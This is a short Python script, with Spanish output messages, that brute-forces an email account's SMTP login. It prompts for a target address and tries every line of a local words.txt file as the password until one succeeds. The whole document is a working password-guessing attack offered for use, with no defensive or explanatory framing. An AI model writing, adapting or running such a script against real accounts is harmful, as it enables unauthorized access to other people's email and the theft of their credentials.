import smtplib

s = smtplib.SMTP("...", 25)
s.ehlo()
s.starttls()

print("\n")

email = input("Email:> ")

words = open("./words.txt", "r")

for pwd in words:
    try:
        s.login(email, pwd)
        print("Contraseña Correcta: %s" %pwd)
        break
    except smtplib.SMTPAuthenticationError:
        print("Contraseña incorrecta: %s" %pwd)
